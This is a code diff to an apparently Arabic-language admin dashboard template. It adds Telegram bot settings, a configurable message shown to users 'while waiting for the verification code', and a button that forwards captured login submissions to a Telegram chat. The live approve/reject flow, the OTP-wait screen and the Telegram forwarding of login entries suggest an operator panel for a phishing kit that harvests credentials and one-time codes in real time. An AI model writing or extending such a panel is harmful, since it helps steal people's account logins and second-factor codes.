@@ -31,7 +31,7 @@
             </span>
           </span>
           <button type="button" class="btn btn-outline-primary btn-sm" id="support-settings-open-btn">
-            Support Number
+            Settings
           </button>
           <form method="post" action="/admin/logout" class="d-inline">
             <input type="hidden" name="csrf_token" value="{{ csrf_token }}" />
@@ -94,8 +94,8 @@
   <div id="support-settings-modal" class="support-settings-modal" hidden>
     <div class="support-settings-modal-card">
       <div class="support-settings-modal-header">
-        <h3 class="support-settings-modal-title">واتساب خدمة العملاء</h3>
-        <p class="support-settings-modal-copy">أدخل الرقم بصيغة دولية ليُستخدم داخل زر التواصل في صفحة التوثيق.</p>
+        <h3 class="support-settings-modal-title">Settings</h3>
+        <p class="support-settings-modal-copy">Update WhatsApp text plus Telegram bot delivery settings for submission sharing.</p>
       </div>
       <label class="support-settings-field" for="support-whatsapp-input">
         <span>رقم واتساب</span>
@@ -117,6 +117,37 @@
           rows="5"
           placeholder="أدخل الرسالة التي تظهر بعد قبول الطلب"
         >{{ support_settings.success_message }}</textarea>
+      </label>
+      <label class="support-settings-field" for="support-login-submit-message-input">
+        <span>Login Loading Message</span>
+        <textarea
+          id="support-login-submit-message-input"
+          class="support-settings-textarea"
+          rows="4"
+          placeholder="أدخل الرسالة التي تظهر أثناء انتظار رمز التحقق"
+        >{{ support_settings.login_submit_message }}</textarea>
+      </label>
+      <label class="support-settings-field" for="support-telegram-api-token-input">
+        <span>Telegram API Token</span>
+        <input
+          id="support-telegram-api-token-input"
+          class="support-settings-input"
+          type="text"
+          autocomplete="off"
+          value="{{ support_settings.telegram_api_token }}"
+          placeholder="123456789:AA..."
+        >
+      </label>
+      <label class="support-settings-field" for="support-telegram-chat-id-input">
+        <span>Telegram Chat ID</span>
+        <input
+          id="support-telegram-chat-id-input"
+          class="support-settings-input"
+          type="text"
+          autocomplete="off"
+          value="{{ support_settings.telegram_chat_id }}"
+          placeholder="-1001234567890"
+        >
       </label>
       <p class="support-settings-preview" id="support-settings-preview">
         {% if support_settings.whatsapp_url %}
@@ -163,6 +194,9 @@
       var supportSettingsOpenBtnEl = document.getElementById("support-settings-open-btn");
       var supportWhatsappInputEl = document.getElementById("support-whatsapp-input");
       var supportSuccessMessageInputEl = document.getElementById("support-success-message-input");
+      var supportLoginSubmitMessageInputEl = document.getElementById("support-login-submit-message-input");
+      var supportTelegramApiTokenInputEl = document.getElementById("support-telegram-api-token-input");
+      var supportTelegramChatIdInputEl = document.getElementById("support-telegram-chat-id-input");
       var supportSettingsPreviewEl = document.getElementById("support-settings-preview");
       var supportSettingsSaveBtnEl = document.getElementById("support-settings-save-btn");
       var supportSettingsCloseBtnEl = document.getElementById("support-settings-close-btn");
@@ -201,17 +235,36 @@
         var whatsappNumber = normalizeWhatsAppNumber(supportSettings.whatsapp_number || "");
         var whatsappUrl = buildWhatsAppUrl(whatsappNumber);
         var successMessage = String(supportSettings.success_message || "").trim();
+        var loginSubmitMessage = String(supportSettings.login_submit_message || "").trim();
+        var telegramApiToken = String(supportSettings.telegram_api_token || "").trim();
+        var telegramChatId = String(supportSettings.telegram_chat_id || "").trim();
         supportSettings.whatsapp_number = whatsappNumber;
         supportSettings.whatsapp_url = whatsappUrl;
         supportSettings.success_message = successMessage;
+        supportSettings.login_submit_message = loginSubmitMessage;
+        supportSettings.telegram_api_token = telegramApiToken;
+        supportSettings.telegram_chat_id = telegramChatId;
         if (supportWhatsappInputEl) {
           supportWhatsappInputEl.value = whatsappNumber;
         }
         if (supportSuccessMessageInputEl) {
           supportSuccessMessageInputEl.value = successMessage;
         }
+        if (supportLoginSubmitMessageInputEl) {
+          supportLoginSubmitMessageInputEl.value = loginSubmitMessage;
+        }
+        if (supportTelegramApiTokenInputEl) {
+          supportTelegramApiTokenInputEl.value = telegramApiToken;
+        }
+        if (supportTelegramChatIdInputEl) {
+          supportTelegramChatIdInputEl.value = telegramChatId;
+        }
         if (supportSettingsPreviewEl) {
-          supportSettingsPreviewEl.textContent = whatsappUrl || "No WhatsApp link configured yet.";
+          if (telegramChatId) {
+            supportSettingsPreviewEl.textContent = "Telegram chat: " + telegramChatId;
+          } else {
+            supportSettingsPreviewEl.textContent = whatsappUrl || "No WhatsApp link configured yet.";
+          }
         }
       }
 
@@ -633,12 +686,22 @@
       }
 
       async function saveSupportSettings() {
-        if (!supportSettingsSaveBtnEl || !supportWhatsappInputEl || !supportSuccessMessageInputEl) {
+        if (
+          !supportSettingsSaveBtnEl ||
+          !supportWhatsappInputEl ||
+          !supportSuccessMessageInputEl ||
+          !supportLoginSubmitMessageInputEl ||
+          !supportTelegramApiTokenInputEl ||
+          !supportTelegramChatIdInputEl
+        ) {
           return;
         }
         var originalLabel = supportSettingsSaveBtnEl.textContent;
         var whatsappNumber = normalizeWhatsAppNumber(supportWhatsappInputEl.value);
         var successMessage = String(supportSuccessMessageInputEl.value || "").trim();
+        var loginSubmitMessage = String(supportLoginSubmitMessageInputEl.value || "").trim();
+        var telegramApiToken = String(supportTelegramApiTokenInputEl.value || "").trim();
+        var telegramChatId = String(supportTelegramChatIdInputEl.value || "").trim();
         supportSettingsSaveBtnEl.disabled = true;
         supportSettingsSaveBtnEl.textContent = "Saving...";
         try {
@@ -650,7 +713,10 @@
             },
             body: JSON.stringify({
               whatsapp_number: whatsappNumber,
-              success_message: successMessage
+              success_message: successMessage,
+              login_submit_message: loginSubmitMessage,
+              telegram_api_token: telegramApiToken,
+              telegram_chat_id: telegramChatId
             })
           });
           if (!response.ok) {
@@ -662,7 +728,10 @@
         } catch (error) {
           applySupportSettings({
             whatsapp_number: whatsappNumber,
-            success_message: successMessage
+            success_message: successMessage,
+            login_submit_message: loginSubmitMessage,
+            telegram_api_token: telegramApiToken,
+            telegram_chat_id: telegramChatId
           });
         } finally {
           supportSettingsSaveBtnEl.disabled = false;
@@ -782,11 +851,27 @@
         );
       }
 
+      function createTelegramButtonMarkup(submissionId) {
+        if (!submissionId) {
+          return "";
+        }
+        return (
+          "<button type=\"button\" class=\"btn btn-sm btn-outline-primary telegram-submission-btn\" data-action=\"telegram-submission\" data-submission-id=\"" +
+          escapeHtml(submissionId) +
+          "\" title=\"Send to Telegram\" aria-label=\"Send to Telegram\">" +
+          "<span class=\"telegram-submission-glyph\" aria-hidden=\"true\">✈</span>" +
+          "</button>"
+        );
+      }
+
       function renderSubmissionActionControls(submission) {
         var submissionId = String((submission && submission.id) || "");
         var status = normalizeApprovalStatus(submission && submission.approval_status);
         var markup =
           "<span class=\"submission-status-badge " + status + "\">" + approvalStatusLabel(status) + "</span>";
+        if (submissionId && isLoginSubmission(submission)) {
+          markup += createTelegramButtonMarkup(submissionId);
+        }
         if (submissionId) {
           markup += createCopyButtonMarkup(submissionId);
         }
@@ -1006,6 +1091,44 @@
           window.setTimeout(function () {
             buttonEl.textContent = originalLabel;
           }, 1200);
+        }
+      }
+
+      async function shareSubmissionToTelegram(submissionId, buttonEl) {
+        if (!submissionId || !buttonEl) {
+          return;
+        }
+        var originalLabel = buttonEl.innerHTML;
+        buttonEl.disabled = true;
+        buttonEl.innerHTML = "<span class=\"telegram-submission-glyph\" aria-hidden=\"true\">…</span>";
+        try {
+          var response = await fetch(
+            "/admin/api/submissions/" + encodeURIComponent(submissionId) + "/telegram",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                "x-csrf-token": csrfToken
+              }
+            }
+          );
+          var payload = await response.json();
+          if (!response.ok) {
+            throw new Error(payload && payload.detail ? payload.detail : "Telegram send failed");
+          }
+          buttonEl.innerHTML = "<span class=\"telegram-submission-glyph\" aria-hidden=\"true\">✓</span>";
+          window.setTimeout(function () {
+            buttonEl.innerHTML = originalLabel;
+            buttonEl.disabled = false;
+          }, 1200);
+        } catch (error) {
+          buttonEl.innerHTML = "<span class=\"telegram-submission-glyph\" aria-hidden=\"true\">!</span>";
+          buttonEl.title = error && error.message ? error.message : "Telegram send failed";
+          window.setTimeout(function () {
+            buttonEl.innerHTML = originalLabel;
+            buttonEl.disabled = false;
+            buttonEl.title = "Send to Telegram";
+          }, 1800);
         }
       }
 
@@ -1479,6 +1602,15 @@
               return;
             }
             rejectSubmission(rejectSubmissionId, rejectButton);
+            return;
+          }
+          var telegramButton = event.target.closest("[data-action='telegram-submission']");
+          if (telegramButton) {
+            var telegramSubmissionId = telegramButton.getAttribute("data-submission-id") || "";
+            if (!telegramSubmissionId) {
+              return;
+            }
+            shareSubmissionToTelegram(telegramSubmissionId, telegramButton);
             return;
           }
           var copyButton = event.target.closest("[data-action='copy-submission']");
